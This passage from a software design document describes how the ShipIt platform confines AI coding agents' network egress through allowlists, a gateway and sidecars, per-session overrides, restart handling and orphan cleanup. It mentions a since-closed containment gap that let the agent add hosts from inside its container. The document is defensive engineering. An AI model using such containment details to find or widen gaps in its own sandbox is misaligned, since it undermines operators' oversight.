  all compose files). When policy says Contained but the deployment can't enforce, ShipIt
  **fails closed** — the session refuses to start (`container-lifecycle.ts`) — and the installer
  (`deployment/*/setup.sh`) detects an incapable host at install time and offers the opt-out
  (`SESSION_EGRESS_ENFORCE=0`, persisted where `deploy.sh`/`lib.sh` load it). Because the two
  layers are independent, the API surfaces `enforcementActive` (`EgressSettings` /
  `EgressSessionSettings` / `EgressAllowlistView`) and the Settings panel shows an explicit
  "Contained — NOT enforced on this deployment" warning rather than a false-green "Contained",
  so the UI never claims protection it can't deliver.
- **Per-session override.** "Allow this session to also reach `X`" — the smaller-blast-radius
  version of the global switch, matching the real "I'm debugging one thing" need.

- **Surface split — global vs session controls.** A "Settings" dialog should hold app-wide
  settings only, so the egress UI is split by scope rather than crammed into one tab.
  **Settings → Network** holds the *global* controls only: the containment toggle and the
  global allowlist editor. It loads the effective view with **no session in scope**
  (`load(null)`), so per-session ("This session") rows never render there and every editable
  row is global; adds from the dialog are always global. The one *session-scoped* control —
  the **containment override** (Inherit / Contained / Open) — lives on the session's own
  overflow menu in the sidebar instead, behind a **Session settings** item that opens a
  dialog (`SessionSettingsDialog.tsx`, current session only, wired by direct
  `GET /api/egress/allowlist?session=` + `PUT /api/egress/session/:id`). It was originally a
  bare Radix radio group rendered inline at the bottom of the menu (`SessionEgressMode.tsx`),
  but those `text-sm`, icon-less rows broke the menu's visual rhythm; it now matches the other
  menu rows and lives in a styled dialog with room for future per-session settings.
  - **Note on per-session *hosts*.** The blocked-egress card's "Add to allowlist" persists to
    the **global** scope (`egress-handlers.ts`), and the Settings add-scope toggle was removed,
    so the UI no longer creates per-session host entries — `user-session` remains a valid store
    scope (durable model + `PUT /api/egress/session/:id` override), just without a host-add
    surface. If a per-session host editor is ever wanted, it belongs on a session surface, not
    this global dialog.

- **Pending change + "Restart to apply now" (the deferred-to-next-start signal made visible).**
  Egress is a **creation-time** topology choice — the Tier A firewall, Tier B resolver and
  Tier C proxy are plumbed into the agent netns when the container is *created*
  (`container-lifecycle.ts`). Flipping the per-session mode on a **running** session persists
  the override (`PUT /api/egress/session/:id`) but does **not** re-plumb the live container, so
  the change is invisible until the next container start. Previously the menu gave zero
  indication of this; the dialog now makes it explicit:
  - **Live-mode source of truth.** Container creation records the resolved containment it
    actually started with on the in-memory container record — `SessionContainer.egressContainedAtStart`
    (set from `ResolvedEgressConfig.contained` right where the sidecars are installed). This is
    the only authoritative "what is the live container running" value; the resolved policy
    (`store.resolveContained`) is "what the *next* container would run".
  - **The diff rides the existing view.** `EgressSessionSettings` (the body the dialog already
    GETs via `/api/egress/allowlist?session=` and gets back from the `PUT`) gains
    `startedContained` (the live value, `null` when no running container) and a derived
    `pendingRestart` = `startedContained !== null && startedContained !== effectiveContained`.
    The route reads the live value via `deps.containerManager.get(sessionId)` — an in-memory
    record lookup, **not** the agent's netns — so the value stays on the browser-only egress
    surface (SHI-129); no new container-reachable route. When pending, the dialog shows
    "Pending · applies on next container start".
  - **Restart reuses the existing lifecycle control.** "Restart to apply now" calls the
    existing `POST /api/sessions/:id/container/restart` (the same `services/recovery.ts`
    `restartContainer` already surfaced as "Rescue session" in the SessionHealthStrip — breaker
    + loop-detector resets included), then dispatches the `shipit:reconnect-ws` window event so
    App's WS re-handshakes and the worker reattaches to the fresh container (bridged in
    `useAppBootstrap`, mirroring the rewind-restore bridge). This is **not** a new
    shell-shaped task-runner button (CLAUDE.md §5) — it is "apply the pending change" framed on
    an existing lifecycle action. Restart is **never** automatic on mode selection, and is
    **disabled while an agent turn is running** (`useSessionStore.isLoading`) with an explanatory
    tooltip — restarting would kill the agent (CLAUDE.md never-kill-running-agent rule).
- **Allow-once / add-to-allowlist on block.** When the gateway denies a host, **deny fast**
  (no held sockets) and surface an inline **blocked-egress card** (`host`, allow-once /
  add-to-allowlist / dismiss); the agent retries once the host is permitted. We deliberately
  do *not* hold the TCP connection waiting for a human (client connect-timeouts + prompt
  fatigue + it stalls the turn against §5). "Allow once" is a short-lived grant the next
  attempt consumes. Like other transcript cards, the blocked-egress card must be **persisted**
  (it has a place in scrollback), per the CLAUDE.md side-channel-card rule.

## Allowlist composition

Reuses `egress-allowlist.ts` (already merged on the SHI-90 branch):

- Base list (`EGRESS_DEFAULT_ALLOWLIST`): agent APIs, `.github.com` / `.githubusercontent.com`,
  npm/yarn/pypi, and `.nodejs.org` (node-gyp downloads the Node headers tarball there to
  compile native modules such as `node-pty`; registry fetches alone don't need it, so only
  native builds were affected by its absence).
- Operator extras (`SESSION_EGRESS_ALLOWLIST`) + the browser-managed allowlist above.
- **Live MCP hosts** from the credential store (configured HTTP servers + OAuth providers).
  Post-SHI-129 the agent can no longer add an MCP server from inside the container, so this
  derived set is now user-controlled and tamper-proof — the sub-hole flagged earlier is
  closed.
- GitHub resolved via `gh api meta` CIDR ranges at the gateway (Anthropic's pattern), not
  per-name resolution.

## Relationship to the env-var proxy already on the branch

`egress-proxy.ts` (explicit `HTTP_PROXY` forward proxy) and the `buildEnv` proxy-env
injection were the testable first slice. Under this design the **allowlist matcher is kept**
and the **proxy becomes transparent at the gateway**; the `HTTP_PROXY`/`HTTPS_PROXY`/
`NO_PROXY` env injection is **removed** (no longer needed and never an enforcement boundary).
The `SESSION_EGRESS_PROXY` env flag is superseded by the browser global toggle (env remains
as an operator default / fail-secure floor).

## Key files (planned)

- Gateway provisioning + internal-network topology — `container-lifecycle.ts`,
  `session-container.ts` (extend the existing per-session `createNetwork` to `Internal: true`
  + gateway attachment).
- `egress-gateway.*` (new) — the middlebox: iptables/ipset setup, controlled resolver,
  transparent proxy. NET_ADMIN lives here, never in the agent container.
- Intra-session preview reachability (SHI-90 follow-up, GH #1495) —
  `docker/egress-sidecar/allow-subnet.sh` (the netns rule-adder),
  `allowEgressToSubnets` + `extractNetworkSubnets` (orchestrator-side, unit-tested in
  `egress-firewall-install.test.ts` / `egress-firewall.test.ts`), wired in
  `SessionContainerManager.connectToNetwork` (`session-container.ts`).
- `egress-allowlist.ts` (reused) — host matcher + `composeEgressExtraHosts` composition.
- `egress-allowlist-store.ts` (durable allowlist + containment toggle, SQLite) +
  `egress-reload.ts` (live resolver/proxy relaunch on a durable add).
- `docker/egress-sidecar/sni-proxy/main.go` — the Tier C SNI proxy; Phase-2
  `validateIdentity` (SNI-scoped tenant rules from `EGRESS_PROXY_IDENTITY_RULES`) lives here,
  unit-tested in `sni-proxy/main_test.go`.
- Browser-only routes (default-protected by *not* setting `containerAccessible`; golden
  route-table unchanged — no new container route) — `api-routes-egress.ts`,
  `api-container-guard.ts`. The pending-restart diff is computed here from the live record.
- Live-mode source of truth — `SessionContainer.egressContainedAtStart` (`session-container.ts`),
  recorded at container creation in `container-lifecycle.ts` from `ResolvedEgressConfig.contained`;
  exposed as `startedContained` + `pendingRestart` on `EgressSessionSettings`.
- Client: `stores/egress-store.ts` + `components/SettingsEgress.tsx` (Settings → Network,
  **global-only**) + `components/SessionSidebar/SessionSettingsDialog.tsx` (the per-session
  containment override + pending/"Restart to apply now", opened from the **Session settings**
  item on the session's overflow menu; restart reuses `POST /api/sessions/:id/container/restart`
  via the `shipit:reconnect-ws` bridge in `useAppBootstrap.ts`) + `egress_settings` SSE sync in
  `useServerEvents.ts`.
- Blocked-egress card — persisted transcript card (see CLAUDE.md side-channel-card rule):
  `chat-card-persistence.ts`, `chat-history.ts`, client `visual-elements.ts`.
- `egress-orphan-reaper.ts` (SHI-222) — sidecar orphan cleanup; see below.

## Sidecar lifecycle and orphan cleanup (SHI-222)

The Tier B resolver and Tier C proxy are launched with
`NetworkMode: container:<agentContainerId>` — they have no network stack of their
own, they borrow the agent container's. That makes the agent container their
**netns parent** and makes them useless the moment it dies — there is no longer
anyone in that namespace to resolve DNS for or proxy TLS on behalf of.

What Docker leaves behind is **not one tidy state**, and it's worth being precise
because it's easy to assume otherwise. A sidecar whose process dies with the
namespace gets restarted (`RestartPolicy: on-failure`, capped at 3), fails to join
a dead namespace each time, and settles in `Exited`. But Docker does **not** stop a
`container:`-mode joiner merely because its parent stopped, so a sidecar can just
as well strand **`Running`**, listening on a namespace nobody is in. Either way
it's **inert** — no agent remains to send it traffic, so this is a *resource leak,
not a containment hole* — and either way **nothing self-removes it**.

Two consequences follow, and both are load-bearing in the code: every reap path is
gated on the **parent's** state and never on the sidecar's own, and
`listEgressSidecars` passes **`all: true`** (`listContainers` returns *running*
containers only by default, so without it the exited orphans — the common case —
would be invisible and the whole feature would silently find nothing).

(Tier A is different — it's a one-shot installer that exits by design; its
iptables/ipset rules persist because they live in the *namespace*, not the process.)

Three cleanup paths, one per way the parent can die:

1. **Orchestrator-initiated teardown** (destroy / archive / idle-evict / rescue /
   restart-agent / graceful shutdown / create-failure) — `destroyContainer` stops
   the agent, runs `cleanupSessionDockerResources`'s `shipit-parent-session` label
   sweep, then removes the agent **last**. The ordering is load-bearing: sidecars
   must die before the namespace holder is removed.
2. **The agent container dying on its own** (OOM, crash, host OOM-killer) — the
   `die`/`oom` handler in `container-health.ts` calls `reapSessionEgressSidecars`,
   passing **the id of the container that just died**. This *has* to happen at the
   crash site: the handler also deletes the session's container-map entry, which
   **latches** the leak, because every later `destroyContainer(sessionId)`
   early-returns on `if (!sc) return`. Without the reap here, archiving the crashed
   session afterwards would never sweep, and the sidecars would outlive the session
   entirely. Three properties, each doing a different job:
   - **Scoped to the egress labels**, rather than reusing
     `cleanupSessionDockerResources` — that sweeps *every* `shipit-parent-session`
     child, so on an agent OOM it would also drop the user's compose services,
     networks, and volumes. An agent crash must not cost them their database.
   - **Gated on the parent being genuinely not running** — this is the safety
     guard, the one thing standing between the reap and a live session losing its
     DNS and HTTPS. We do *not* take the event's word for it. A Docker **`oom`
     event does not mean the container died**: it fires when the cgroup's
     OOM-killer kills *a process*, and if that process wasn't PID 1 (say the agent
     CLI is killed but the session worker survives), the container keeps running
     with a perfectly good namespace. The same check disarms the `Actor.ID`-less
     event shape (older daemons), where the dead-container id falls back to the
     tracked `sc.id` and may name the *current*, healthy container.
   - **Scoped to the dead container's id** — belt-and-braces rather than the
     primary guard (liveness alone would already spare a replacement, whose parent
     is running), but it makes the reap idempotent *by construction* instead of by
     timing. The call is fire-and-forget and the session id is stable across
     recreations, so a label-only reap that lands late — the user reactivates while
     `listContainers` is still in flight, which a busy daemon during an OOM storm
     makes likely — comes back holding the **replacement** incarnation's sidecars
     and has to *reason* its way to sparing them. Matching the parent id means they
     never enter the candidate set. Don't delete it because a test still passes
     without it.

   So: the id says **which** namespace we mean; liveness says whether it is
   **actually gone**. Both are required.

   **The reap runs *above* the handler's early-returns, and that ordering is
   itself a fix.** A PID-1 OOM emits **two** events — `oom`, then `die` a few ms
   later, once the daemon has processed the exit. The `oom` arrives while the
   container still reports `Running`, so the liveness gate correctly *declines*.
   But that same pass deletes the container-map entry — so when `die` lands (the
   event that *is* proof of death), a reap sitting below `if (!sc) return` would
   never execute. The leak survived in exactly the crash mode this issue is named
   for. Calling the reap unconditionally on every agent `die`/`oom` is safe
   precisely because it is id-scoped, liveness-gated, and idempotent — which is
   what lets it be hoisted above the guards that exist to protect *session state*,
   not sidecars. It also means a stale `die` (an old incarnation's corpse being
   removed out-of-band) now collects that incarnation's orphans, which is the only
   event we will ever get for them.
3. **Crash-recovery backstop at boot** — `reapOrphanEgressSidecars`, run from
   `runDiskJanitor`, for the orphans a *previous* orchestrator process never got to
   (it died mid-cleanup, the Docker daemon restarted, the agent was `docker rm`'d
   out-of-band). Boot-only, per CLAUDE.md's disk-cleanup rule: this leak grows on
   the crash clock, not the wall clock.

**The netns parent's liveness — never the session label, and never the event — is
the key** for every path above. That's the load-bearing invariant, and two
independent things conspire to make it so. First, the agent container's name and
the session id are both reused across recreations, so a label-only match cannot
tell this incarnation's resolver from the corpse of the last one; it fails in
*both* directions (a sweep would **spare** a dead sidecar it should reap; a
fire-and-forget crash reap would **delete** a live replacement's). Second, a Docker
event is not proof of what it looks like — an `oom` may name a container that is
still happily running. Only "is the namespace I mean actually gone?" is immune to
both. `compose-cli.ts`'s `killStaleContainers` keep-list has to answer the same
question — it spares live sidecars from the pre-start sweep (or they'd be SIGKILLed
~1s after the agent launches, leaving the session with no resolver and no HTTPS) —
but it must **not** spare a dead incarnation's.

The safety argument rests on the agent container carrying **no `RestartPolicy`**:
it never legitimately goes running → stopped → running underneath a live sidecar,
so "parent not running" always means "this sidecar is dead weight", never "wait a
moment."

Everything nonetheless fails **safe toward keeping**: a false reap costs a
*running* session its DNS and HTTPS, while a false keep costs one inert container
that the next boot sweep collects anyway. So an unreadable sidecar, a
structurally-incomplete inspect, a network mode that borrows no namespace, and a
Docker daemon that won't answer all resolve to "keep".

Two probe choices follow from that, and both are easy to "simplify" back into
bugs:

- **The keep-list probes the parent with `docker ps`, not `docker inspect`.**
  `inspect` exits non-zero *both* when a container is gone *and* when the daemon is
  merely unhappy (500, timeout, socket error) — a catch block cannot tell "parent
  gone" from "ask again later", and guessing "gone" lets a transient blip reap a
  live session's sidecars. `ps` exits 0 either way, so "not up" arrives as a value
  to read rather than an exception to interpret.
- **It passes no `--filter status=running`.** A bare `docker ps` (without `-a`)
  already lists exactly the containers whose namespace is alive — and that set
  includes **paused** ones (`Up (Paused)`), which `status=running` would exclude.
  A paused parent still owns a perfectly good netns. The question is "is this
  namespace alive?", not "is this process scheduled?"
- **It passes no `-a`, and that is not an oversight.** The stale-container sweep 90
  lines above legitimately uses `ps -aq`, so `-a` is a tempting copy-paste — but on
  the *liveness probe* it inverts the answer. An exited agent-container corpse
  lingers until the next create removes it by name, so `ps -a` would list it, the
  probe would report the dead parent as alive, and the keep-list would spare
  exactly the garbage it exists to collect. The test fake models `-a` so this
  regression goes red.

Note that an orphaned sidecar is a **resource leak, not a containment hole** —
whether it stranded `Exited` or `Running`. Its namespace has no agent in it, so
there is nothing to serve and no live path to the network, and the recreated agent
container gets a fresh namespace and a fresh Tier A install. The cost of a leaked
one is disk (and, for a stranded-`Running` sidecar, a little memory) — never
egress. That framing matters for triage: this is a janitorial bug, not a security
escalation.

## References

- `anthropics/claude-code` `.devcontainer/init-firewall.sh` (iptables/ipset reference; the
  DNS-open tradeoff).
- `docs/201-container-api-trust-boundary/` (SHI-129) — the browser↔container API boundary
  this relies on.
- `SECURITY-MODEL.md` → "Agent and container containment" / "Known limitations".
- [How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude).
